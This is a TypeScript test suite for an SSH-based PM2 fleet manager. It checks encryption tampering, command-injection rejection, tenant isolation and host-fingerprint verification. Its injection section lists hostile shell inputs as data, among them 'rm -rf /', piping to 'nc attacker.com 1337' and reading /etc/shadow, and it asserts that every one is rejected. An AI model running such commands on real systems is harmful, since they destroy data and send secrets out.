import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createClient } from "@libsql/client";
import { setConfigForTests } from "../src/shared/config";
import { closeAllDatabases, getDb } from "../src/shared/infrastructure/db";
import { servers } from "../src/shared/infrastructure/db/schema/fleet";
import { eq } from "drizzle-orm";
import {
  FleetModule,
  getFleetModule,
  FleetCommandSanitizer,
  CommandSanitizationError,
  Pm2Parser,
  NodeSsh2Adapter,
  AesEncryptionService,
} from "../src/modules/fleet";
import { AesGcmCipher } from "../src/shared/infrastructure/crypto/aes-gcm-cipher";
import {
  ForbiddenError,
  RateLimitError,
  ValidationError,
  ExternalServiceError,
} from "../src/shared/kernel/errors";
import { MockSshClient } from "./helpers/mock-ssh-client";
import { EmulatedSshServer } from "./helpers/emulated-ssh-server";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const masterKeyA = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const masterKeyB = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

process.env.MASTER_KEY = masterKeyA;
process.env.MASTER_KEY_PREVIOUS = masterKeyB;
process.env.AUTH_SECRET = "adversarial-auth-secret-123456789";

describe("Adversarial Empirical Challenge: Fleet Bounded Context", () => {
  const testDataDir = path.join(__dirname, "temp_fleet_adversarial");
  const coreDbPath = path.join(testDataDir, "core.db");

  let mockSshClient: MockSshClient;
  let fleetModule: FleetModule;

  beforeAll(async () => {
    if (fs.existsSync(testDataDir)) {
      try {
        fs.rmSync(testDataDir, { recursive: true, force: true });
      } catch {}
    }
    fs.mkdirSync(testDataDir, { recursive: true });

    process.env.DATA_DIR = testDataDir;
    process.env.MASTER_KEY = masterKeyA;
    process.env.MASTER_KEY_PREVIOUS = masterKeyB;

    setConfigForTests({
      dataDir: testDataDir,
      MASTER_KEY: masterKeyA,
      MASTER_KEY_PREVIOUS: masterKeyB,
      AUTH_SECRET: "adversarial-auth-secret-123456789",
      dbPaths: {
        core: coreDbPath,
        analytics: path.join(testDataDir, "analytics.db"),
        metrics: path.join(testDataDir, "metrics.db"),
      },
    });

    const client = createClient({ url: `file:${coreDbPath}` });
    await client.execute("PRAGMA journal_mode = WAL;");
    await client.execute("PRAGMA synchronous = NORMAL;");
    await client.execute("PRAGMA busy_timeout = 5000;");

    await client.execute(`
      CREATE TABLE IF NOT EXISTS servers (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        host TEXT NOT NULL,
        port INTEGER NOT NULL DEFAULT 22,
        username TEXT NOT NULL DEFAULT 'ubuntu',
        encrypted_private_key TEXT NOT NULL,
        key_passphrase_enc TEXT,
        host_fingerprint TEXT,
        status TEXT NOT NULL DEFAULT 'pending',
        last_checked_at INTEGER,
        error_message TEXT,
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
      );
    `);

    await client.execute(`
      CREATE TABLE IF NOT EXISTS pm2_processes (
        id TEXT PRIMARY KEY,
        server_id TEXT NOT NULL,
        pm2_id INTEGER NOT NULL,
        name TEXT NOT NULL,
        client_id TEXT,
        allow_client_restart INTEGER NOT NULL DEFAULT 0,
        restart_cooldown_sec INTEGER NOT NULL DEFAULT 60,
        status TEXT NOT NULL DEFAULT 'stopped',
        cpu INTEGER NOT NULL DEFAULT 0,
        memory INTEGER NOT NULL DEFAULT 0,
        restarts INTEGER NOT NULL DEFAULT 0,
        uptime_ms INTEGER DEFAULT 0,
        last_discovered_at INTEGER NOT NULL,
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
      );
    `);
    await client.execute(`
      CREATE UNIQUE INDEX IF NOT EXISTS idx_pm2_processes_server_pm2id ON pm2_processes (server_id, pm2_id);
    `);

    await client.execute(`
      CREATE TABLE IF NOT EXISTS process_actions (
        id TEXT PRIMARY KEY,
        process_id TEXT NOT NULL,
        client_id TEXT,
        action TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        triggered_by TEXT NOT NULL,
        output_excerpt TEXT,
        error_message TEXT,
        created_at INTEGER NOT NULL
      );
    `);

    client.close();

    mockSshClient = new MockSshClient();
    fleetModule = getFleetModule({ sshClient: mockSshClient });
  });

  afterAll(() => {
    closeAllDatabases();
    try {
      if (fs.existsSync(testDataDir)) {
        fs.rmSync(testDataDir, { recursive: true, force: true });
      }
    } catch {}
  });

  describe("1. Cryptographic Forensics & Envelope Tampering", () => {
    it("rejects ciphertext with bit-flipped payload via GCM auth tag failure", () => {
      const plaintext = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----";
      const ciphertext = AesGcmCipher.encrypt(plaintext, masterKeyA);
      const parts = ciphertext.split(":");
      expect(parts).toHaveLength(3);

      const iv = parts[0]!;
      const tag = parts[1]!;
      const data = parts[2]!;

      // Tamper 1 character of base64 data
      const tamperedChar = data[0] === "A" ? "B" : "A";
      const tamperedData = tamperedChar + data.slice(1);
      const tamperedCiphertext = `${iv}:${tag}:${tamperedData}`;

      expect(() => AesGcmCipher.decrypt(tamperedCiphertext, masterKeyA)).toThrow();
    });

    it("rejects ciphertext with tampered auth tag", () => {
      const plaintext = "super-secret-ssh-key";
      const ciphertext = AesGcmCipher.encrypt(plaintext, masterKeyA);
      const parts = ciphertext.split(":");

      const iv = parts[0]!;
      const tag = parts[1]!;
      const data = parts[2]!;

      const tamperedTag = (tag[0] === "X" ? "Y" : "X") + tag.slice(1);
      const tamperedCiphertext = `${iv}:${tamperedTag}:${data}`;

      expect(() => AesGcmCipher.decrypt(tamperedCiphertext, masterKeyA)).toThrow();
    });

    it("rejects invalid envelope structures (missing colons, corrupted delimiters)", () => {
      expect(() => AesGcmCipher.decrypt("not-a-valid-envelope", masterKeyA)).toThrowError(
        "Invalid ciphertext envelope format"
      );
      expect(() => AesGcmCipher.decrypt("part1:part2", masterKeyA)).toThrowError(
        "Invalid ciphertext envelope format"
      );
      expect(() => AesGcmCipher.decrypt("part1:part2:part3:part4", masterKeyA)).toThrowError(
        "Invalid ciphertext envelope format"
      );
    });

    it("supports seamless decryption with previous master key on rotation", () => {
      const secret = "legacy-key-before-rotation";
      // Encrypt with Key B (the previous key)
      const cipherB = AesGcmCipher.encrypt(secret, masterKeyB);

      // Decrypt using AesEncryptionService configured with masterKeyA and previousKeyB
      const svc = new AesEncryptionService(masterKeyA, masterKeyB);
      const decrypted = svc.decrypt(cipherB);
      expect(decrypted).toBe(secret);
    });

    it("confirms raw database file contains zero occurrences of plaintext keys", async () => {
      const sensitiveMarker = "VERY_SENSITIVE_OPENSSH_KEY_TEST_MARKER_998877";
      const fakeKey = `-----BEGIN OPENSSH PRIVATE KEY-----\n${sensitiveMarker}\n-----END OPENSSH PRIVATE KEY-----`;

      const srv = await fleetModule.registerServer({
        name: "Forensic Target",
        host: "10.99.99.1",
        privateKey: fakeKey,
        keyPassphrase: "SENSITIVE_PASSPHRASE_MARKER_112233",
      });

      // Query raw database
      const db = getDb("core");
      const rows = await db.select().from(servers).where(eq(servers.id, srv.id));
      const row = rows[0]!;

      expect(row.encryptedPrivateKey).not.toContain(sensitiveMarker);
      expect(row.keyPassphraseEnc).not.toContain("SENSITIVE_PASSPHRASE_MARKER");

      // Verify the file content on disk as well
      const dbBytes = fs.readFileSync(coreDbPath);
      expect(dbBytes.includes(Buffer.from(sensitiveMarker))).toBe(false);
      expect(dbBytes.includes(Buffer.from("SENSITIVE_PASSPHRASE_MARKER"))).toBe(false);
    });
  });

  describe("2. Adversarial Command Injection Matrix", () => {
    const maliciousInputs = [
      "; rm -rf /",
      "&& touch /tmp/pwned",
      "|| echo hacked",
      "| nc attacker.com 1337",
      "& reboot",
      "\ncat /etc/passwd",
      "\r\nwhoami",
      "$(whoami)",
      "`id`",
      "${IFS}whoami",
      "> /var/log/auth.log",
      "< /dev/null",
      "2>&1",
      "*",
      "?",
      "0x10",
      "1.5",
      "1e4",
      "Infinity",
      "-Infinity",
      "NaN",
      "-1",
      "-999",
      "1 2",
      "1\t2",
      "1;id",
      "1 && id",
      "1\0",
      "../../../etc/passwd",
    ];

    it("rejects all malicious inputs for pm2 restart", () => {
      for (const input of maliciousInputs) {
        expect(() => FleetCommandSanitizer.buildRestartCommand(input)).toThrowError(
          CommandSanitizationError
        );
      }
    });

    it("rejects all malicious lines inputs for pm2 logs", () => {
      const badLines = [
        0,
        -1,
        -50,
        1001,
        100000,
        "100; rm -rf /",
        "50 && echo pwn",
        "10\nreboot",
        "NaN",
        "0x20",
        "50.5",
      ];

      for (const line of badLines) {
        expect(() => FleetCommandSanitizer.buildLogsCommand(1, line as any)).toThrowError(
          CommandSanitizationError
        );
      }
    });

    it("rejects commands not strictly matching the allowlist regex", () => {
      const disallowedCommands = [
        "pm2 jlist ; rm -rf /",
        "pm2 jlist && whoami",
        "pm2 jlist\nls",
        "pm2 restart 1; echo pwned",
        "pm2 restart 1 && cat /etc/shadow",
        "pm2 restart 1 | nc 10.0.0.1 4444",
        "pm2 logs 1 --nostream --lines 100; cat /etc/passwd",
        "pm2 start app.js",
        "pm2 stop 1",
        "pm2 delete 1",
        "pm2 save",
        "sh -c whoami",
        "cat /etc/passwd",
        "echo 123",
      ];

      for (const cmd of disallowedCommands) {
        expect(() => FleetCommandSanitizer.assertAllowlisted(cmd)).toThrowError(
          CommandSanitizationError
        );
      }
    });

    it("accepts valid bounded commands", () => {
      expect(FleetCommandSanitizer.buildRestartCommand(0)).toBe("pm2 restart 0");
      expect(FleetCommandSanitizer.buildRestartCommand("0")).toBe("pm2 restart 0");
      expect(FleetCommandSanitizer.buildRestartCommand(12345)).toBe("pm2 restart 12345");
      expect(FleetCommandSanitizer.buildLogsCommand(0, 1)).toBe(
        "pm2 logs 0 --nostream --lines 1"
      );
      expect(FleetCommandSanitizer.buildLogsCommand(99, 1000)).toBe(
        "pm2 logs 99 --nostream --lines 1000"
      );
      expect(() => FleetCommandSanitizer.assertAllowlisted("pm2 jlist")).not.toThrow();
      expect(() =>
        FleetCommandSanitizer.assertAllowlisted("pm2 restart 42")
      ).not.toThrow();
      expect(() =>
        FleetCommandSanitizer.assertAllowlisted("pm2 logs 42 --nostream --lines 500")
      ).not.toThrow();
    });
  });

  describe("3. Authorization Isolation & Cross-Client Attack Vectors", () => {
    let serverId: string;
    let procAliceId: string;
    let procBobId: string;
    let procUnmappedId: string;

    beforeAll(async () => {
      const srv = await fleetModule.registerServer({
        name: "Multi-Tenant Host",
        host: "10.0.10.1",
        privateKey: "dummy-key-content",
      });
      serverId = srv.id;

      // Mock returning 3 processes
      mockSshClient.jlistResponse = JSON.stringify([
        { pid: 101, name: "alice-api", pm_id: 0, monit: {}, pm2_env: { status: "online" } },
        { pid: 102, name: "bob-api", pm_id: 1, monit: {}, pm2_env: { status: "online" } },
        { pid: 103, name: "system-core", pm_id: 2, monit: {}, pm2_env: { status: "online" } },
      ]);

      const procs = await fleetModule.discoverProcesses(serverId);
      procAliceId = procs.find((p) => p.name === "alice-api")!.id;
      procBobId = procs.find((p) => p.name === "bob-api")!.id;
      procUnmappedId = procs.find((p) => p.name === "system-core")!.id;

      // Alice process: client = cli_alice, restart enabled
      await fleetModule.mapProcessToClient({
        processId: procAliceId,
        clientId: "cli_alice",
        allowClientRestart: true,
        restartCooldownSec: 10,
      });

      // Bob process: client = cli_bob, restart disabled
      await fleetModule.mapProcessToClient({
        processId: procBobId,
        clientId: "cli_bob",
        allowClientRestart: false,
        restartCooldownSec: 60,
      });

      // procUnmappedId remains unmapped (clientId = null)
    });

    it("rejects Alice attempting to restart Bob's process (403 Forbidden)", async () => {
      await expect(
        fleetModule.restartProcess({
          processId: procBobId,
          actor: { realm: "client", clientId: "cli_alice", userId: "usr_alice" },
        })
      ).rejects.toThrowError(ForbiddenError);
    });

    it("rejects Bob attempting to view Alice's process logs (403 Forbidden)", async () => {
      await expect(
        fleetModule.getProcessLogs({
          processId: procAliceId,
          actor: { realm: "client", clientId: "cli_bob", userId: "usr_bob" },
        })
      ).rejects.toThrowError(ForbiddenError);
    });

    it("rejects client attempting to restart unmapped system process (403 Forbidden)", async () => {
      await expect(
        fleetModule.restartProcess({
          processId: procUnmappedId,
          actor: { realm: "client", clientId: "cli_alice", userId: "usr_alice" },
        })
      ).rejects.toThrowError(ForbiddenError);
    });

    it("rejects client attempting to view logs of unmapped system process (403 Forbidden)", async () => {
      await expect(
        fleetModule.getProcessLogs({
          processId: procUnmappedId,
          actor: { realm: "client", clientId: "cli_alice", userId: "usr_alice" },
        })
      ).rejects.toThrowError(ForbiddenError);
    });

    it("rejects Bob restarting own process when allowClientRestart is false (403 Forbidden)", async () => {
      await expect(
        fleetModule.restartProcess({
          processId: procBobId,
          actor: { realm: "client", clientId: "cli_bob", userId: "usr_bob" },
        })
      ).rejects.toThrowError(ForbiddenError);
    });

    it("allows admin actor to restart unmapped or client processes", async () => {
      const res = await fleetModule.restartProcess({
        processId: procUnmappedId,
        actor: { realm: "admin", userId: "adm_owner" },
      });
      expect(res.success).toBe(true);
    });

    it("enforces cooldown timer on rapid consecutive restarts", async () => {
      // First restart succeeds
      const res1 = await fleetModule.restartProcess({
        processId: procAliceId,
        actor: { realm: "client", clientId: "cli_alice", userId: "usr_alice" },
      });
      expect(res1.success).toBe(true);

      // Second restart immediately after must fail with 429 RateLimitError
      await expect(
        fleetModule.restartProcess({
          processId: procAliceId,
          actor: { realm: "client", clientId: "cli_alice", userId: "usr_alice" },
        })
      ).rejects.toThrowError(RateLimitError);
    });
  });

  describe("4. PM2 Parser Robustness", () => {
    it("handles ANSI escape sequences and PM2 daemon notices", () => {
      const noisy = `
        \u001b[32m[PM2]\u001b[39m Spawning PM2 daemon with pm2_home=/root/.pm2
        \u001b[34m[PM2]\u001b[39m PM2 Successfully daemonized
        [
          {
            "name": "worker-1",
            "pm_id": 0,
            "pid": 2048,
            "monit": { "cpu": 5.2, "memory": 204800 },
            "pm2_env": { "status": "online", "restart_time": 3, "pm_uptime": 1600000000000 }
          }
        ]
      `;
      const result = Pm2Parser.parseJlist(noisy);
      expect(result).toHaveLength(1);
      expect(result[0]?.name).toBe("worker-1");
      expect(result[0]?.pmId).toBe(0);
      expect(result[0]?.status).toBe("online");
    });

    it("handles empty output gracefully", () => {
      expect(Pm2Parser.parseJlist("")).toEqual([]);
      expect(Pm2Parser.parseJlist("   ")).toEqual([]);
    });

    it("rejects corrupted or truncated JSON with ValidationError", () => {
      expect(() => Pm2Parser.parseJlist("[{ 'name': unterminated")).toThrowError(
        ValidationError
      );
      expect(() => Pm2Parser.parseJlist("{ 'notAnArray': true }")).toThrowError(
        ValidationError
      );
      expect(() => Pm2Parser.parseJlist("random text without brackets")).toThrowError(
        ValidationError
      );
    });
  });

  describe("5. Host Fingerprint & Real SSH Verification", () => {
    let emulatedServer: EmulatedSshServer;
    let emulatedPort: number;

    beforeAll(async () => {
      emulatedServer = new EmulatedSshServer();
      emulatedPort = await emulatedServer.start();
    });

    afterAll(async () => {
      await emulatedServer.stop();
    });

    it("rejects connection when host key fingerprint does not match (MITM prevention)", async () => {
      const netAdapter = new NodeSsh2Adapter();
      const srvConfig = {
        serverId: "srv_mitm_test",
        host: "127.0.0.1",
        port: emulatedPort,
        username: "ubuntu",
        decryptedPrivateKey: emulatedServer.privateKey,
        hostFingerprint: "SHA256:wrongFingerprintInvalidHashValue00000000000=",
      };

      await expect(
        netAdapter.execute(srvConfig, "pm2 jlist")
      ).rejects.toThrowError(ExternalServiceError);

      await netAdapter.disconnectAll();
    });
  });
});
